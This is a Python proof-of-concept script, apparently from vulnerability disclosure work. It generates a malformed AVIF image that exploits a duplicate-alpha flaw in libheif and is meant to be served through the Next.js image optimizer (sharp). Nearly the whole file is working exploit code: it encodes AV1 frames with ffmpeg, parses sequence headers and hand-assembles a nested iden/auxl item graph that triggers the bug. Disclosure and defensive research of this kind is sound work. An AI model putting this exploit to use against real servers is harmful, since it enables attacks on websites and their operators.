#!/usr/bin/env python3
"""
AV1 (av01) variant of the libheif duplicate-Alpha PoC (GHSA-g89c-p67h-r497)
for use against Next.js image optimizer (GHSA-2xp9-vwfh-vxw4).

Same nested iden/auxl item graph as gen_poc.py, but items use AV1 (av01)
instead of HEVC (hvc1), because the prebuilt libheif bundled with sharp has
no HEVC decoder while AV1 is supported (aom/dav1d).

The av01 item payload is the first frame payload of an ffmpeg libaom-av1
IVF stream, i.e. the aom frame packet (temporal unit OBU stream), which is
exactly what libheif's aom decoder passes to aom_codec_decode().

Prerequisites: Python 3.6+, ffmpeg with libaom-av1.
"""

import struct, subprocess, tempfile, os, io, sys

class BitReader:
    def __init__(self, data):
        self.data = data
        self.pos = 0

    def get(self, n):
        v = 0
        for _ in range(n):
            byte = self.data[self.pos // 8]
            bit = (byte >> (7 - self.pos % 8)) & 1
            v = (v << 1) | bit
            self.pos += 1
        return v

def _read_leb(data, p):
    v = 0
    shift = 0
    while True:
        b = data[p]
        p += 1
        v |= (b & 0x7F) << shift
        if not (b & 0x80):
            break
        shift += 7
    return v, p

def _generate_av1(width, height, pix_fmt):
    fd, path = tempfile.mkstemp(suffix=".ivf")
    os.close(fd)
    try:
        subprocess.run([
            "ffmpeg", "-y", "-f", "lavfi",
            "-i", f"color=c=gray:s={width}x{height}",
            "-frames:v", "1", "-c:v", "libaom-av1",
            "-still-picture", "1", "-cpu-used", "8", "-crf", "30",
            "-pix_fmt", pix_fmt, "-f", "ivf", path,
        ], capture_output=True, check=True)
        with open(path, "rb") as f:
            data = f.read()
    finally:
        os.unlink(path)
    assert data[:4] == b"DKIF", "unexpected IVF header"
    off = 32
    size = struct.unpack("<I", data[off:off+4])[0]
    payload = data[off+4+8:off+4+8+size]  # skip 8-byte pts field
    return payload

def _parse_obus(payload):
    obus = []
    p = 0
    while p < len(payload):
        b0 = payload[p]
        p += 1
        if b0 & 0x80:
            raise ValueError("OBU forbidden bit set")
        otype = (b0 >> 3) & 0xF
        ext = (b0 >> 2) & 1
        has_size = (b0 >> 1) & 1
        if ext:
            p += 1
        if has_size:
            size, p = _read_leb(payload, p)
            obus.append((otype, payload[p:p+size]))
            p += size
        else:
            obus.append((otype, payload[p:]))
            break
    return obus

def _parse_seq_header(payload):
    r = BitReader(payload)
    seq_profile = r.get(3)
    still_picture = r.get(1)
    reduced = r.get(1)
    seq_level_idx_0 = 0
    seq_tier_0 = 0
    if reduced:
        seq_level_idx_0 = r.get(5)
    else:
        timing_info_present = r.get(1)
        if timing_info_present:
            r.get(32)
            r.get(32)
            if r.get(1):
                r.get(r.get(4) + 1)
        decoder_model_info_present = r.get(1)
        if decoder_model_info_present:
            r.get(5)   # buffer_delay_length_minus_1
            r.get(32)  # num_units_in_decoding_tick
            r.get(5)   # buffer_removal_time_length_minus_1
            r.get(32)  # frame_presentation_time_length_minus_1
        initial_display_delay_present = r.get(1)
        op_cnt = r.get(5) + 1
        for i in range(op_cnt):
            r.get(12)  # operating_point_idc
            lvl = r.get(5)
            tier = r.get(1) if lvl > 7 else 0
            if i == 0:
                seq_level_idx_0 = lvl
                seq_tier_0 = tier
            if initial_display_delay_present:
                r.get(4)
    fw_bits = r.get(4) + 1
    fh_bits = r.get(4) + 1
    r.get(fw_bits)
    r.get(fh_bits)
    if not reduced:
        if r.get(1):  # frame_id_numbers_present_flag
            r.get(4)
            r.get(3)
    r.get(1)  # use_128x128_superblock
    r.get(1)  # enable_filter_intra
    r.get(1)  # enable_intra_edge_filter
    if not reduced:
        r.get(1)  # enable_interintra_compound
        r.get(1)  # enable_masked_compound
        r.get(1)  # enable_warped_motion
        r.get(1)  # enable_dual_filter
        enable_order_hint = r.get(1)
        if enable_order_hint:
            r.get(1)  # enable_jnt_comp
            r.get(1)  # enable_ref_frame_mvs
        seq_choose_screen = r.get(1)
        if seq_choose_screen:
            if r.get(1) > 0:  # seq_force_screen_content_tools
                if r.get(1):  # seq_choose_integer_mv
                    r.get(1)
        else:
            if r.get(1):  # seq_choose_integer_mv
                r.get(1)
        if enable_order_hint:
            r.get(3)  # order_hint_bits_minus_1
    r.get(1)  # enable_superres
    r.get(1)  # enable_cdef
    r.get(1)  # enable_restoration
    high_bitdepth = r.get(1)
    twelve_bit = 0
    if seq_profile == 2 and high_bitdepth:
        twelve_bit = r.get(1)
    monochrome = 0 if seq_profile == 1 else r.get(1)
    color_desc_present = r.get(1)
    cp = tc = mc = None
    if color_desc_present:
        cp = r.get(8)
        tc = r.get(8)
        mc = r.get(8)
    if monochrome:
        r.get(1)  # color_range
        subsampling_x = 1
        subsampling_y = 1
        csp = 0
    elif cp == 1 and tc == 13 and mc == 0:
        r.get(1)
        subsampling_x = 0
        subsampling_y = 0
        csp = 0
    else:
        r.get(1)  # color_range
        if seq_profile == 0:
            subsampling_x = 1
            subsampling_y = 1
        elif seq_profile == 1:
            subsampling_x = 0
            subsampling_y = 0
        elif seq_profile == 3:
            raise NotImplementedError("seq_profile==3 not supported")
        else:
            if twelve_bit:
                subsampling_x = r.get(1)
                subsampling_y = r.get(1) if subsampling_x else 0
            else:
                subsampling_x = r.get(1)
                subsampling_y = r.get(1)
        if subsampling_x and subsampling_y:
            csp = r.get(2)
        else:
            csp = 0
    return {
        "seq_profile": seq_profile,
        "seq_level_idx_0": seq_level_idx_0,
        "seq_tier_0": seq_tier_0,
        "high_bitdepth": high_bitdepth,
        "twelve_bit": twelve_bit,
        "monochrome": monochrome,
        "subsampling_x": subsampling_x,
        "subsampling_y": subsampling_y,
        "csp": csp,
    }

def _build_av1c(payload):
    obus = _parse_obus(payload)
    for otype, body in obus:
        if otype == 1:  # OBU_SEQUENCE_HEADER
            cfg = _parse_seq_header(body)
            cfg_bytes = bytes([
                0x81,
                (cfg["seq_profile"] << 5) | cfg["seq_level_idx_0"],
                (cfg["seq_tier_0"] << 7)
                | (cfg["high_bitdepth"] << 6)
                | (cfg["twelve_bit"] << 5)
                | (cfg["monochrome"] << 4)
                | (cfg["subsampling_x"] << 3)
                | (cfg["subsampling_y"] << 2)
                | cfg["csp"],
                0x00,
            ])
            return cfg_bytes, cfg
    raise ValueError("no sequence header OBU found in av1 payload")

def _box(tag, p=b""):
    return struct.pack(">I", 8 + len(p)) + tag + p

def _fullbox(tag, ver, flags, p=b""):
    return _box(tag, struct.pack(">I", (ver << 24) | flags) + p)

def build_poc(primary_size=128):
    assert primary_size >= 64 and primary_size % 64 == 0
    print("[*] Generating AV1 bitstreams (primary %dx%d) ..." % (primary_size, primary_size))
    d1 = _generate_av1(64, 64, "yuv420p")
    d2 = d1
    d4 = _generate_av1(64, 64, "yuv420p10le")
    d5 = _generate_av1(primary_size, primary_size, "yuv420p")

    av1c8, cfg8 = _build_av1c(d1)
    av1c10, cfg10 = _build_av1c(d4)
    av1c128, cfg128 = _build_av1c(d5)
    print("[*] av1C 8-bit:", cfg8)
    print("[*] av1C 10-bit:", cfg10)
    print("[*] av1C 128px:", cfg128)
    assert cfg8["high_bitdepth"] == 0
    assert cfg10["high_bitdepth"] == 1

    ftyp = _box(b"ftyp", b"avif" + struct.pack(">I", 0) + b"avifmif1miaf")
    mdat = _box(b"mdat", d1 + d2 + d4 + d5)
    base = len(ftyp) + 8
    o1 = base
    o2 = o1 + len(d1)
    o4 = o2 + len(d2)
    o5 = o4 + len(d4)

    hdlr = _fullbox(b"hdlr", 0, 0,
        struct.pack(">I", 0) + b"pict" + b"\x00" * 12 + b"\x00")
    pitm = _fullbox(b"pitm", 0, 0, struct.pack(">H", 5))

    def infe(iid, typ, nm=b""):
        return _fullbox(b"infe", 2, 0,
            struct.pack(">HH", iid, 0) + typ + nm + b"\x00")
    iinf = _fullbox(b"iinf", 0, 0, struct.pack(">H", 5) +
        infe(1, b"av01") + infe(2, b"av01") + infe(3, b"iden") +
        infe(4, b"av01") + infe(5, b"av01"))

    def sref(rt, fi, tl):
        return _box(rt, struct.pack(">HH", fi, len(tl)) +
            b"".join(struct.pack(">H", t) for t in tl))
    iref = _fullbox(b"iref", 0, 0,
        sref(b"auxl", 2, [1]) + sref(b"dimg", 3, [1]) +
        sref(b"auxl", 3, [5]) + sref(b"auxl", 4, [3]))

    ispe64  = _fullbox(b"ispe", 0, 0, struct.pack(">II", 64, 64))
    ispe128 = _fullbox(b"ispe", 0, 0, struct.pack(">II", primary_size, primary_size))
    a3 = _box(b"av1C", av1c8)
    a4 = _box(b"av1C", av1c10)
    a5 = _box(b"av1C", av1c128)
    auxc = _fullbox(b"auxC", 0, 0,
        b"urn:mpeg:mpegB:cicp:systems:auxiliary:alpha\x00")
    ipco = _box(b"ipco", ispe64 + ispe128 + a3 + a4 + a5 + auxc)

    def ipma_e(iid, al):
        return struct.pack(">HB", iid, len(al)) + \
            b"".join(struct.pack("B", ((1 if e else 0) << 7) | (i & 0x7F))
                     for e, i in al)
    ipma = _fullbox(b"ipma", 0, 0, struct.pack(">I", 5) +
        ipma_e(1, [(1,1),(1,3)]) +
        ipma_e(2, [(1,1),(1,3),(1,6)]) +
        ipma_e(3, [(1,1),(1,6)]) +
        ipma_e(4, [(1,1),(1,4),(1,6)]) +
        ipma_e(5, [(1,2),(1,5)]))
    iprp = _box(b"iprp", ipco + ipma)

    def iloc_i(iid, off, ln):
        return struct.pack(">HHHII", iid, 0, 1, off, ln)
    def iloc_e(iid):
        return struct.pack(">HHH", iid, 0, 0)
    iloc = _fullbox(b"iloc", 0, 0,
        struct.pack("BB", 0x44, 0x00) + struct.pack(">H", 5) +
        iloc_i(1, o1, len(d1)) + iloc_i(2, o2, len(d2)) +
        iloc_e(3) + iloc_i(4, o4, len(d4)) + iloc_i(5, o5, len(d5)))

    meta = _fullbox(b"meta", 0, 0, hdlr + pitm + iinf + iref + iprp + iloc)
    return ftyp + mdat + meta

if __name__ == "__main__":
    primary = int(sys.argv[1]) if len(sys.argv) > 1 else 128
    name = "poc-av1.avif" if primary == 128 else f"poc-av1-{primary}.avif"
    with open(name, "wb") as f:
        f.write(build_poc(primary))
    print("[+] Written", name)
